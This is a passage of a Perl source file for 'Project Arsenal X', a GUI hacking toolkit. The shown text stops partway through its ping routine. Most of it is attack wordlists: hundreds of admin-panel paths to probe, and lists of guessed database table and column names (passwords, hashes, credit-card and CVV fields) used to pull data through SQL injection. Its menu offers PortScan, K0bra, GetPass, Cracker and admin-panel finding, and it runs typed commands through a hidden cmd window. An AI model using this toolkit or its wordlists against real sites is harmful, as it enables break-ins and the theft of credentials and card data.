#!usr/bin/perl
#Project Arsenal X 0.2
#(C) Doddy Hackman 2015
#
#Necessary modules
#ppm install http://www.open.com.au/radiator/free-downloads/Net-SSLeay.ppd
#ppm install http://www.bribes.org/perl/ppm/IO-Socket-SSL.ppd
#ppm install http://trouchelle.com/ppm/GMail-Checker.ppd
#ppm install http://trouchelle.com/ppm/HTML-Strip.ppd
#ppm install http://trouchelle.com/ppm/Net-Telnet.ppd
#ppm install http://trouchelle.com/ppm/Mail-POP3Client.ppd
#ppm install http://www.bribes.org/perl/ppm/DBI.ppd
#ppm install http://www.bribes.org/perl/ppm/DBD-mysql.ppd
#
#The arrays are a collection of various tools I found on the web.

my @paneles = (
    'admin/admin.asp',               'admin/login.asp',
    'admin/index.asp',               'admin/admin.aspx',
    'admin/login.aspx',              'admin/index.aspx',
    'admin/webmaster.asp',           'admin/webmaster.aspx',
    'asp/admin/index.asp',           'asp/admin/index.aspx',
    'asp/admin/admin.asp',           'asp/admin/admin.aspx',
    'asp/admin/webmaster.asp',       'asp/admin/webmaster.aspx',
    'admin/',                        'login.asp',
    'login.aspx',                    'admin.asp',
    'admin.aspx',                    'webmaster.aspx',
    'webmaster.asp',                 'login/index.asp',
    'login/index.aspx',              'login/login.asp',
    'login/login.aspx',              'login/admin.asp',
    'login/admin.aspx',              'administracion/index.asp',
    'administracion/index.aspx',     'administracion/login.asp',
    'administracion/login.aspx',     'administracion/webmaster.asp',
    'administracion/webmaster.aspx', 'administracion/admin.asp',
    'administracion/admin.aspx',     'php/admin/',
    'admin/admin.php',               'admin/index.php',
    'admin/login.php',               'admin/system.php',
    'admin/ingresar.php',            'admin/administrador.php',
    'admin/default.php',             'administracion/',
    'administracion/index.php',      'administracion/login.php',
    'administracion/ingresar.php',   'administracion/admin.php',
    'administration/',               'administration/index.php',
    'administration/login.php',      'administrator/index.php',
    'administrator/login.php',       'administrator/system.php',
    'system/',                       'system/login.php',
    'admin.php',                     'login.php',
    'administrador.php',             'administration.php',
    'administrator.php',             'admin1.html',
    'admin1.php',                    'admin2.php',
    'admin2.html',                   'yonetim.php',
    'yonetim.html',                  'yonetici.php',
    'yonetici.html',                 'adm/',
    'admin/account.php',             'admin/account.html',
    'admin/index.html',              'admin/login.html',
    'admin/home.php',                'admin/controlpanel.html',
    'admin/controlpanel.php',        'admin.html',
    'admin/cp.php',                  'admin/cp.html',
    'cp.php',                        'cp.html',
    'administrator/',                'administrator/index.html',
    'administrator/login.html',      'administrator/account.html',
    'administrator/account.php',     'administrator.html',
    'login.html',                    'modelsearch/login.php',
    'moderator.php',                 'moderator.html',
    'moderator/login.php',           'moderator/login.html',
    'moderator/admin.php',           'moderator/admin.html',
    'moderator/',                    'account.php',
    'account.html',                  'controlpanel/',
    'controlpanel.php',              'controlpanel.html',
    'admincontrol.php',              'admincontrol.html',
    'adminpanel.php',                'adminpanel.html',
    'admin1.asp',                    'admin2.asp',
    'yonetim.asp',                   'yonetici.asp',
    'admin/account.asp',             'admin/home.asp',
    'admin/controlpanel.asp',        'admin/cp.asp',
    'cp.asp',                        'administrator/index.asp',
    'administrator/login.asp',       'administrator/account.asp',
    'administrator.asp',             'modelsearch/login.asp',
    'moderator.asp',                 'moderator/login.asp',
    'moderator/admin.asp',           'account.asp',
    'controlpanel.asp',              'admincontrol.asp',
    'adminpanel.asp',                'fileadmin/',
    'fileadmin.php',                 'fileadmin.asp',
    'fileadmin.html',                'administration.html',
    'sysadmin.php',                  'sysadmin.html',
    'phpmyadmin/',                   'myadmin/',
    'sysadmin.asp',                  'sysadmin/',
    'ur-admin.asp',                  'ur-admin.php',
    'ur-admin.html',                 'ur-admin/',
    'Server.php',                    'Server.html',
    'Server.asp',                    'Server/',
    'wp-admin/',                     'administr8.php',
    'administr8.html',               'administr8/',
    'administr8.asp',                'webadmin/',
    'webadmin.php',                  'webadmin.asp',
    'webadmin.html',                 'administratie/',
    'admins/',                       'admins.php',
    'admins.asp',                    'admins.html',
    'administrivia/',                'Database_Administration/',
    'WebAdmin/',                     'useradmin/',
    'sysadmins/',                    'admin1/',
    'system-administration/',        'administrators/',
    'pgadmin/',                      'directadmin/',
    'staradmin/',                    'ServerAdministrator/',
    'SysAdmin/',                     'administer/',
    'LiveUser_Admin/',               'sys-admin/',
    'typo3/',                        'panel/',
    'cpanel/',                       'cPanel/',
    'cpanel_file/',                  'platz_login/',
    'rcLogin/',                      'blogindex/',
    'formslogin/',                   'autologin/',
    'support_login/',                'meta_login/',
    'manuallogin/',                  'simpleLogin/',
    'loginflat/',                    'utility_login/',
    'showlogin/',                    'memlogin/',
    'members/',                      'login-redirect/',
    'sub-login/',                    'wp-login/',
    'login1/',                       'dir-login/',
    'login_db/',                     'xlogin/',
    'smblogin/',                     'customer_login/',
    'UserLogin/',                    'login-us/',
    'acct_login/',                   'admin_area/',
    'bigadmin/',                     'project-admins/',
    'phppgadmin/',                   'pureadmin/',
    'sql-admin/',                    'radmind/',
    'openvpnadmin/',                 'wizmysqladmin/',
    'vadmind/',                      'ezsqliteadmin/',
    'hpwebjetadmin/',                'newsadmin/',
    'adminpro/',                     'Lotus_Domino_Admin/',
    'bbadmin/',                      'vmailadmin/',
    'Indy_admin/',                   'ccp14admin/',
    'irc-macadmin/',                 'banneradmin/',
    'sshadmin/',                     'phpldapadmin/',
    'macadmin/',                     'administratoraccounts/',
    'admin4_account/',               'admin4_colon/',
    'radmind-1/',                    'Super-Admin/',
    'AdminTools/',                   'cmsadmin/',
    'SysAdmin2/',                    'globes_admin/',
    'cadmins/',                      'phpSQLiteAdmin/',
    'navSiteAdmin/',                 'server_admin_small/',
    'logo_sysadmin/',                'server/',
    'database_administration/',      'power_user/',
    'system_administration/',        'ss_vms_admin_sm/'
);

my @buscar1 = (
    'usuario',                 'web_users',
    'name',                    'names',
    'nombre',                  'nombres',
    'usuarios',                'member',
    'members',                 'admin_table',
    'usuaris',                 'admin',
    'tblUsers',                'tblAdmin',
    'user',                    'users',
    'username',                'usernames',
    'web_usuarios',            'miembro',
    'miembros',                'membername',
    'admins',                  'administrator',
    'sign',                    'config',
    'USUARIS',                 'cms_operadores',
    'administrators',          'passwd',
    'password',                'passwords',
    'pass',                    'Pass',
    'mpn_authors',             'author',
    'musuario',                'mysql.user',
    'user_names',              'foro',
    'tAdmin',                  'tadmin',
    'user_password',           'user_passwords',
    'user_name',               'member_password',
    'mods',                    'mod',
    'moderators',              'moderator',
    'user_email',              'jos_users',
    'mb_user',                 'host',
    'apellido_nombre',         'user_emails',
    'user_mail',               'user_mails',
    'mail',                    'emails',
    'email',                   'address',
    'jos_usuarios',            'tutorial_user_auth',
    'e-mail',                  'emailaddress',
    'correo',                  'correos',
    'phpbb_users',             'log',
    'logins',                  'login',
    'tbl_usuarios',            'user_auth',
    'login_radio',             'registers',
    'register',                'usr',
    'usrs',                    'ps',
    'pw',                      'un',
    'u_name',                  'u_pass',
    'tbl_admin',               'usuarios_head',
    'tpassword',               'tPassword',
    'u_password',              'nick',
    'nicks',                   'manager',
    'managers',                'administrador',
    'BG_CMS_Users',            'tUser',
    'tUsers',                  'administradores',
    'clave',                   'login_id',
    'pwd',                     'pas',
    'sistema_id',              'foro_usuarios',
    'cliente',                 'sistema_usuario',
    'sistema_password',        'contrasena',
    'auth',                    'key',
    'senha',                   'signin',
    'dir_admin',               'alias',
    'clientes',                'tb_admin',
    'tb_administrator',        'tb_login',
    'tb_logon',                'tb_members_tb_member',
    'calendar_users',          'cursos',
    'tb_users',                'tb_user',
    'tb_sys',                  'sys',
    'fazerlogon',              'logon',
    'fazer',                   'authorization',
    'curso',                   'membros',
    'utilizadores',            'staff',
    'nuke_authors',            'accounts',
    'account',                 'accnts',
    'signup',                  'leads',
    'lead',                    'associated',
    'accnt',                   'customers',
    'customer',                'membres',
    'administrateur',          'utilisateur',
    'riacms_users',            'tuser',
    'tusers',                  'utilisateurs',
    'amministratore',          'god',
    'God',                     'authors',
    'wp_users',                'tb_usuarios',
    'asociado',                'asociados',
    'autores',                 'autor',
    'Users',                   'Admin',
    'Members',                 'tb_usuario',
    'Miembros',                'Usuario',
    'Usuarios',                'ADMIN',
    'USERS',                   'USER',
    'MEMBER',                  'MEMBERS',
    'USUARIO',                 'USUARIOS',
    'MIEMBROS',                'MIEMBRO',
    'USR_NAME',                'about',
    'access',                  'admin_id',
    'admin_name',              'admin_pass',
    'admin_passwd',            'admin_password',
    'admin_pwd',               'admin_user',
    'admin_userid',            'admin_username',
    'adminemail',              'adminid',
    'administrator_name',      'adminlogin',
    'adminmail',               'adminname',
    'adminuser',               'adminuserid',
    'adminusername',           'aid',
    'aim',                     'apwd',
    'auid',                    'authenticate',
    'authentication',          'blog',
    'cc_expires',              'cc_number',
    'cc_owner',                'cc_type',
    'cfg',                     'cid',
    'clientname',              'clientpassword',
    'clientusername',          'conf',
    'contact',                 'converge_pass_hash',
    'converge_pass_salt',      'crack',
    'customers_email_address', 'customers_password',
    'cvvnumber]',              'data',
    'db_database_name',        'db_hostname',
    'db_password',             'db_username',
    'download',                'e_mail',
    'emer',                    'emni',
    'emniplote',               'emri',
    'fjalekalimi',             'fjalekalimin',
    'full',                    'gid',
    'group',                   'group_name',
    'hash',                    'hashsalt',
    'homepage',                'icq',
    'icq_number',              'id',
    'id_group',                'id_member',
    'images',                  'ime',
    'index',                   'ip_address',
    'kodi',                    'korisnici',
    'korisnik',                'kpro_user',
    'last_ip',                 'last_login',
    'lastname',                'llogaria',
    'login_admin',             'login_name',
    'login_pass',              'login_passwd',
    'login_password',          'login_pw',
    'login_pwd',               'login_user',
    'login_username',          'logini',
    'loginkey',                'loginout',
    'logo',                    'logohu',
    'lozinka',                 'md5hash',
    'mem_login',               'mem_pass',
    'mem_passwd',              'mem_password',
    'mem_pwd',                 'member_id',
    'member_login_key',        'member_name',
    'memberid',                'memlogin',
    'mempassword',             'my_email',
    'my_name',                 'my_password',
    'my_username',             'myname',
    'mypassword',              'myusername',
    'nc',                      'new',
    'news',                    'number',
    'nummer',                  'p_assword',
    'p_word',                  'pass_hash',
    'pass_w',                  'pass_word',
    'pass1word',               'passw',
    'passwordsalt',            'passwort',
    'passwrd',                 'perdorimi',
    'perdoruesi',              'personal_key',
    'phone',                   'privacy',
    'psw',                     'punetoret',
    'punonjes',                'pword',
    'pwrd',                    'salt',
    'search',                  'secretanswer',
    'secretquestion',          'serial',
    'session_member_id',       'session_member_login_key',
    'sesskey',                 'setting',
    'sid',                     'sifra',
    'spacer',                  'status',
    'store',                   'store1',
    'store2',                  'store3',
    'store4',                  'table_prefix',
    'temp_pass',               'temp_password',
    'temppass',                'temppasword',
    'text',                    'uid',
    'uname',                   'user_admin',
    'user_icq',                'user_id',
    'user_ip',                 'user_level',
    'user_login',              'user_n',
    'user_pass',               'user_passw',
    'user_passwd',             'user_pw',
    'user_pwd',                'user_pword',
    'user_pwrd',               'user_un',
    'user_uname',              'user_username',
    'user_usernm',             'user_usernun',
    'user_usrnm',              'user1',
    'useradmin',               'userid',
    'userip',                  'userlogin',
    'usern',                   'usernm',
    'userpass',                'userpassword',
    'userpw',                  'userpwd',
    'usr_n',                   'usr_name',
    'usr_pass',                'usr2',
    'usrn',                    'usrnam',
    'usrname',                 'usrnm',
    'usrpass',                 'warez',
    'xar_name',                'xar_pass',
    'nom dutilisateur',        'mot de passe',
    'compte',                  'comptes',
    'aide',                    'objectif',
    'authentifier',            'authentification',
    'Contact',                 'fissure',
    'client',                  'clients',
    'de donn?es',              'mot_de_passe_bdd',
    't?l?charger',             'E-mail',
    'adresse e-mail',          'Emer',
    'complet',                 'groupe',
    'hachage',                 'Page daccueil',
    'Kodi',                    'nom',
    'connexion',               'membre',
    'MEMBERNAME',              'mon_mot_de_passe',
    'monmotdepasse',           'ignatiusj',
    'caroline-du-nord',        'nouveau',
    'Nick',                    'passer',
    'Passw',                   'Mot de passe',
    't?l?phone',               'protection de la vie priv?e',
    'PSW',                     'pWord',
    'sel',                     'recherche',
    'de s?rie',                'param?tre',
    '?tat',                    'stocker',
    'texte',                   'cvvnumber'
);
my @buscar2 = (
    'name',                          'user',
    'user_name',                     'user_username',
    'uname',                         'user_uname',
    'usern',                         'user_usern',
    'un',                            'user_un',
    'mail',                          'cliente',
    'usrnm',                         'user_usrnm',
    'usr',                           'admin_name',
    'cla_adm',                       'usu_adm',
    'fazer',                         'logon',
    'fazerlogon',                    'authorization',
    'membros',                       'utilizadores',
    'sysadmin',                      'email',
    'senha',                         'username',
    'usernm',                        'user_usernm',
    'nm',                            'user_nm',
    'login',                         'u_name',
    'nombre',                        'host',
    'pws',                           'cedula',
    'userName',                      'host_password',
    'chave',                         'alias',
    'apellido_nombre',               'cliente_nombre',
    'cliente_email',                 'cliente_pass',
    'cliente_user',                  'cliente_usuario',
    'login_id',                      'sistema_id',
    'author',                        'user_login',
    'admin_user',                    'admin_pass',
    'uh_usuario',                    'uh_password',
    'psw',                           'host_username',
    'sistema_usuario',               'auth',
    'key',                           'usuarios_nombre',
    'usuarios_nick',                 'usuarios_password',
    'user_clave',                    'membername',
    'nme',                           'unme',
    'password',                      'user_password',
    'autores',                       'pass_hash',
    'hash',                          'pass',
    'correo',                        'usuario_nombre',
    'usuario_nick',                  'usuario_password',
    'userpass',                      'user_pass',
    'upw',                           'pword',
    'user_pword',                    'passwd',
    'user_passwd',                   'passw',
    'user_passw',                    'pwrd',
    'user_pwrd',                     'pwd',
    'authors',                       'user_pwd',
    'u_pass',                        'clave',
    'usuario',                       'contrasena',
    'pas',                           'sistema_password',
    'autor',                         'upassword',
    'web_password',                  'web_username',
    'tbladmins',                     'sort',
    '_wfspro_admin',                 '4images_users',
    'a_admin',                       'account',
    'accounts',                      'adm',
    'admin',                         'admin_login',
    'admin_userinfo',                'administer',
    'administrable',                 'administrate',
    'administration',                'administrator',
    'administrators',                'adminrights',
    'admins',                        'adminuser',
    'art',                           'article_admin',
    'articles',                      'artikel',
    'ÃÜÂë',                          'aut',
    'autore',                        'backend',
    'backend_users',                 'backenduser',
    'bbs',                           'book',
    'chat_config',                   'chat_messages',
    'chat_users',                    'client',
    'clients',                       'clubconfig',
    'company',                       'config',
    'contact',                       'contacts',
    'content',                       'control',
    'cpg_config',                    'cpg132_users',
    'customer',                      'customers',
    'customers_basket',              'dbadmins',
    'dealer',                        'dealers',
    'diary',                         'download',
    'Dragon_users',                  'e107.e107_user',
    'e107_user',                     'forum.ibf_members',
    'fusion_user_groups',            'fusion_users',
    'group',                         'groups',
    'ibf_admin_sessions',            'ibf_conf_settings',
    'ibf_members',                   'ibf_members_converge',
    'ibf_sessions',                  'icq',
    'images',                        'index',
    'info',                          'ipb.ibf_members',
    'ipb_sessions',                  'joomla_users',
    'jos_blastchatc_users',          'jos_comprofiler_members',
    'jos_contact_details',           'jos_joomblog_users',
    'jos_messages_cfg',              'jos_moschat_users',
    'jos_users',                     'knews_lostpass',
    'korisnici',                     'kpro_adminlogs',
    'kpro_user',                     'links',
    'login_admin',                   'login_admins',
    'login_user',                    'login_users',
    'logins',                        'logs',
    'lost_pass',                     'lost_passwords',
    'lostpass',                      'lostpasswords',
    'm_admin',                       'main',
    'mambo_session',                 'mambo_users',
    'manage',                        'manager',
    'mb_users',                      'member',
    'memberlist',                    'members',
    'minibbtable_users',             'mitglieder',
    'movie',                         'movies',
    'mybb_users',                    'mysql',
    'mysql.user',                    'names',
    'news',                          'news_lostpass',
    'newsletter',                    'nuke_authors',
    'nuke_bbconfig',                 'nuke_config',
    'nuke_popsettings',              'nuke_users',
    'ÓÃ»§',                          'obb_profiles',
    'order',                         'orders',
    'parol',                         'partner',
    'partners',                      'passes',
    'passwords',                     'perdorues',
    'perdoruesit',                   'phorum_session',
    'phorum_user',                   'phorum_users',
    'phpads_clients',                'phpads_config',
    'phpbb_users',                   'phpBB2.forum_users',
    'phpBB2.phpbb_users',            'phpmyadmin.pma_table_info',
    'pma_table_info',                'poll_user',
    'punbb_users',                   'pwds',
    'reg_user',                      'reg_users',
    'registered',                    'reguser',
    'regusers',                      'session',
    'sessions',                      'settings',
    'shop.cards',                    'shop.orders',
    'site_login',                    'site_logins',
    'sitelogin',                     'sitelogins',
    'sites',                         'smallnuke_members',
    'smf_members',                   'SS_orders',
    'statistics',                    'superuser',
    'sysadmins',                     'system',
    'sysuser',                       'sysusers',
    'table',                         'tables',
    'tb_admin',                      'tb_administrator',
    'tb_login',                      'tb_member',
    'tb_members',                    'tb_user',
    'tb_username',                   'tb_usernames',
    'tb_users',                      'tbl',
    'tbl_user',                      'tbl_users',
    'tbluser',                       'tbl_clients',
    'tbl_client',                    'tblclients',
    'tblclient',                     'test',
    'usebb_members',                 'user_admin',
    'user_info',                     'user_list',
    'user_logins',                   'user_names',
    'usercontrol',                   'userinfo',
    'userlist',                      'userlogins',
    'usernames',                     'userrights',
    'users',                         'vb_user',
    'vbulletin_session',             'vbulletin_user',
    'voodoo_members',                'webadmin',
    'webadmins',                     'webmaster',
    'webmasters',                    'webuser',
    'webusers',                      'x_admin',
    'xar_roles',                     'xoops_bannerclient',
    'xoops_users',                   'yabb_settings',
    'yabbse_settings',               'ACT_INFO',
    'ActiveDataFeed',                'Category',
    'CategoryGroup',                 'ChicksPass',
    'ClickTrack',                    'Country',
    'CountryCodes1',                 'CustomNav',
    'DataFeedPerformance1',          'DataFeedPerformance2',
    'DataFeedPerformance2_incoming', 'DataFeedShowtag1',
    'DataFeedShowtag2',              'DataFeedShowtag2_incoming',
    'dtproperties',                  'Event',
    'Event_backup',                  'Event_Category',
    'EventRedirect',                 'Events_new',
    'Genre',                         'JamPass',
    'MyTicketek',                    'MyTicketekArchive',
    'News',                          'PerfPassword',
    'PerfPasswordAllSelected',       'Promotion',
    'ProxyDataFeedPerformance',      'ProxyDataFeedShowtag',
    'ProxyPriceInfo',                'Region',
    'SearchOptions',                 'Series',
    'Sheldonshows',                  'StateList',
    'States',                        'SubCategory',
    'Subjects',                      'Survey',
    'SurveyAnswer',                  'SurveyAnswerOpen',
    'SurveyQuestion',                'SurveyRespondent',
    'sysconstraints',                'syssegments',
    'tblRestrictedPasswords',        'tblRestrictedShows',
    'TimeDiff',                      'Titles',
    'ToPacmail1',                    'ToPacmail2',
    'UserPreferences',               'uvw_Category',
    'uvw_Pref',                      'uvw_Preferences',
    'Venue',                         'venues',
    'VenuesNew',                     'X_3945',
    'tblArtistCategory',             'tblArtists',
    'tblConfigs',                    'tblLayouts',
    'tblLogBookAuthor',              'tblLogBookEntry',
    'tblLogBookImages',              'tblLogBookImport',
    'tblLogBookUser',                'tblMails',
    'tblNewCategory',                'tblNews',
    'tblOrders',                     'tblStoneCategory',
    'tblStones',                     'tblUser',
    'tblWishList',                   'VIEW1',
    'viewLogBookEntry',              'viewStoneArtist',
    'vwListAllAvailable',            'CC_info',
    'CC_username',                   'cms_user',
    'cms_users',                     'cms_admin',
    'cms_admins',                    'jos_user',
    'table_user',                    'bulletin',
    'cc_info',                       'login_name',
    'admuserinfo',                   'userlistuser_list',
    'SiteLogin',                     'Site_Login',
    'UserAdmin',                     'Admins',
    'Login',                         'Logins'
);

use Cwd;
use Tk;
use Tk::Dialog;
use Tk::HList;
use Tk::ROText;
use Tk::ListBox;
use Tk::FileSelect;
use Win32::Job;
use IO::Socket;
use Net::Ping;
use GMail::Checker;
use HTML::Strip;
use LWP::UserAgent;
use URI::Split qw(uri_split);
use Net::FTP;
use Net::POP3;
use Net::Telnet;
use DBI;
use Mail::POP3Client;
use IO::Socket::SSL;

my $nave = LWP::UserAgent->new;
$nave->agent(
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0"
);
$nave->timeout(5);

my $color_fondo = "black";
my $color_texto = "green";

if ( $^O eq 'MSWin32' ) {
    use Win32::Console;
    Win32::Console::Free();
}

my $mejor =
  MainWindow->new( -background => $color_fondo, -foreground => $color_texto );
$mejor->title("Project Arsenal X 0.2 (C) Doddy Hackman 2015");
$mejor->geometry("731x570+20+20");
$mejor->resizable( 0, 0 );

$mejor->Button(
    -text             => "Inbox",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_inbox
)->place( -x => 20, -y => 20 );
$mejor->Button(
    -text             => "Ping",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_ping
)->place( -x => 120, -y => 20 );
$mejor->Button(
    -text             => "Whois",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_whois
)->place( -x => 20, -y => 50 );
$mejor->Button(
    -text             => "Downloader",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_downloader
)->place( -x => 120, -y => 50 );
$mejor->Button(
    -text             => "PortScan",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_port
)->place( -x => 420, -y => 50 );
$mejor->Button(
    -text             => "GetIP",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_getip
)->place( -x => 220, -y => 20 );
$mejor->Button(
    -text             => "LocateIP",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_locate
)->place( -x => 220, -y => 50 );
$mejor->Button(
    -text             => "K0bra",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_kobra
)->place( -x => 320, -y => 20 );
$mejor->Button(
    -text             => "GetPass",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_getpass
)->place( -x => 320, -y => 50 );
$mejor->Button(
    -text             => "PanelControl",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_panel
)->place( -x => 420, -y => 20 );
$mejor->Button(
    -text             => "Cracker",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_cracker
)->place( -x => 520, -y => 20 );
$mejor->Button(
    -text             => "About",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_about
)->place( -x => 620, -y => 20 );
$mejor->Button(
    -text             => "Exit",
    -width            => 14,
    -background       => $color_texto,
    -foreground       => $color_fondo,
    -activebackground => $color_texto,
    -command          => \&menu_exit
)->place( -x => 620, -y => 50 );

my $body = $mejor->Text(
    -width      => 98,
    -height     => 30,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 19, -y => 100 );

$body->insert( "end", "- Arsenal X - Command Console\n" );
$body->insert( "end", "Running program version 0.2\n" );
$body->insert( "end", "-----------------------------\n" );
$body->insert( "end", "\nWelcome to hell ........\n\n" );
$body->insert( "end", "<root[.]>" );

$mejor->bind(
    $body,
    "<Key-Return>" => sub {

        $text = $body->get( "1.0", "end" );
        chomp $text;

        $text =~ / .* <root\[.\]> \s* (.+?) \s+ $ /msx;
        my @cmdnow = cmd($1);
        $body->insert( "end", "\n@cmdnow\n" );
        $body->insert( "end", "\n<root[.]>" );
    }
);

my $ip = get_ip();

$mejor->Label(
    -text       => "Your IP is $ip",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 540 );
$mejor->Label(
    -text       => "(C) Doddy Hackman 2015",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 550, -y => 540 );

MainLoop;

sub get_ip {
    my $get = gethostbyname("");
    return inet_ntoa($get);
}

sub cmd {

    my $job = Win32::Job->new;
    $job->spawn(
        "cmd",
        qq{cmd /C $_[0]},
        {
            no_window => "true",
            stdout    => "logx.txt",
            stderr    => "logx.txt"
        }
    );
    $ok = $job->run("30");

    open( F, "logx.txt" );
    @words = <F>;
    close F;

    unlink("logx.txt");

    return @words;

}

###Funciones principales

sub menu_inbox {    #Start

    my $yeahfucktk = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $yeahfucktk->title(
        "Gmail Inbox 0.2 || (C) Doddy Hackman 2015 || [+] Status : <None>");
    $yeahfucktk->geometry("870x220+20+20");
    $yeahfucktk->resizable( 0, 0 );

    my $agen = $yeahfucktk->Scrolled( HList,
        -columns    => 4,
        -header     => 1,
        -width      => 80,
        -scrollbars => "se"
    )->place( -x => 20, -y => 20 );

    $agen->headerCreate( 0, -text => "ID" );
    $agen->headerCreate( 1, -text => "From" );
    $agen->headerCreate( 2, -text => "Subject" );
    $agen->headerCreate( 3, -text => "Date" );

    $agen->bind( "<Double-1>", [ \&yeah ] );

    $yeahfucktk->Label(
        -text       => "Gmail Login",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 650, -y => 20 );
    $yeahfucktk->Label(
        -text       => "Username : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 565, -y => 68 );
    my $username = $yeahfucktk->Entry(
        -width      => 30,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 653, -y => 73 );
    $yeahfucktk->Label(
        -text       => "Password : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 565, -y => 100 );
    my $password = $yeahfucktk->Entry(
        -width      => 30,
        -show       => "*",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 653, -y => 103 );
    $yeahfucktk->Button(
        -text             => "Messages list",
        -width            => 20,
        -command          => \&startnow,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->place( -x => 640, -y => 150 );

    MainLoop;

    sub startnow {
        $agen->delete( "all", 0 );
        my $total = total( $username->get, $password->get );
        $yeahfucktk->title(
"Gmail Inbox 0.2 || (C) Doddy Hackman 2015 || [+] Status : $total messages found"
        );

        for ( reverse 1 .. $total ) {
            $yeahfucktk->update;
            $yeahfucktk->title(
"Gmail Inbox 0.2 || (C) Doddy Hackman 2015 || [+] Status : Getting message $_"
            );
            my ( $from, $asunto, $date ) =
              getdata( $username->get, $password->get, $_ );

            $agen->add($_);
            $agen->itemCreate( $_, 0, -text => $_ );
            $agen->itemCreate( $_, 1, -text => $from );
            $agen->itemCreate( $_, 2, -text => $asunto );
            $agen->itemCreate( $_, 3, -text => $date );

        }
        $yeahfucktk->title(
            "Gmail Inbox 0.2 || (C) Doddy Hackman 2015 || [+] Status : <None>");
    }

    sub total {
        my $mod_total =
          new GMail::Checker( USERNAME => $_[0], PASSWORD => $_[1] );
        my ( $a, $b ) = $mod_total->get_msg_nb_size("TOTAL_MSG");
        return $a;
    }

    sub getdata {

        my $mod_msg =
          new GMail::Checker( USERNAME => $_[0], PASSWORD => $_[1] );
        my @msg = $mod_msg->get_msg( MSG => $_[2] );

        my $mas = $msg[0]->{headers};

        if ( $mas =~ /From: (.*)/ig ) {
            $from = $1;
        }

        if ( $mas =~ /Subject: (.*)/ig ) {
            $asunto = $1;
        }

        if ( $mas =~ /Date: (.*)/ig ) {
            $date = $1;
        }
        return ( $from, $asunto, $date );
    }

    sub yeah {
        my @ar = $agen->selectionGet();
        openmessage( $username->get, $password->get, $ar[0] );
    }

    sub openmessage {

        my $cons = MainWindow->new();
        $cons->geometry("500x350+20+20");
        $cons->resizable( 0, 0 );
        $cons->title("Reading message");

        my $conso = $cons->Scrolled(
            "ROText",
            -width      => 70,
            -height     => 40,
            -scrollbars => "e"
        )->pack();

        my $mod_msg =
          new GMail::Checker( USERNAME => $_[0], PASSWORD => $_[1] );

        my @msg = $mod_msg->get_msg( MSG => $_[2] );

        $conso->insert( "end", "[+] ID : $_[2]\n" );

        my $mas = $msg[0]->{headers};

        if ( $mas =~ /From: (.*)/ig ) {
            my $from = $1;
            $conso->insert( "end", "[+] From : $from\n" );
        }

        if ( $mas =~ /To: (.*)/ig ) {
            my $to = $1;
            $conso->insert( "end", "[+] To : $to\n" );
        }

        if ( $mas =~ /Subject: (.*)/ig ) {
            my $asunto = $1;
            $conso->insert( "end", "[+] Subject : $asunto\n" );
        }

        if ( $mas =~ /Date: (.*)/ig ) {
            my $date = $1;
            $conso->insert( "end", "[+] Date : $date\n\n" );
        }

        my $text = $msg[0]->{body};
        if ( $text =~
            /<body class=3D'hmmessage'><div dir=3D'ltr'>(.*?)<\/div><\/body>/sig
          )
        {
            my $body = $1;
            $body =~ s/<br>/\n/g;

            my $uno = HTML::Strip->new( emit_spaces => 1 );
            my $body = $uno->parse($body);
            $conso->insert( "end", $body );
        }
    }

}    #End

sub menu_ping {    #Start

    my $sax = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $sax->title("Ping It 0.2 || (C) Doddy Hackman 2015");
    $sax->geometry("350x130+20+20");
    $sax->resizable( 0, 0 );

    $sax->Label(
        -text       => "Host : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 20, -x => 20 );
    my $host = $sax->Entry(
        -width      => 30,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 25, -x => 70 );
    $sax->Button(
        -text             => "Ping It",
        -width            => 10,
        -command          => \&pingita,
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto
    )->place( -y => 23, -x => 260 );

    my $stat = $sax->Label(
        -text       => "Status : <None>",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -y => 80, -x => 110 );

    MainLoop;

    sub pingita {

        $clas = Net::Ping->new("icmp");
        if ( $clas->ping( $host->get ) ) {
            $stat->configure( -text => "The host is alive" );
        }
        else {
